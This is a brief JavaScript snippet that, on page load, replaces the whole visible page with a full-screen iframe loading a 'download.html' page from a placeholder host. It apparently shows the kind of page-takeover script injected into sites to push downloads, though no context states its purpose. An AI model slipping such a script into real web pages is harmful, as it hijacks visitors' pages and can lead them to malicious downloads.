(function main(window){
    window.onload = function (){
        let frame = window.document.createElement("iframe");
        frame.width = window.innerWidth;
        frame.height = window.innerHeight;
        frame.className = 'fullScreen';
        frame.setAttribute("src", "https://placeholder.xyz.net/download.html");
        let newbody = window.document.createElement('body');
        newbody.append(frame);
        setTimeout(() => {
            window.document.getElementsByTagName('body')[0].remove();
            window.document.getElementsByTagName('html')[0].append(newbody);
        }, 1000);

    }
})(window)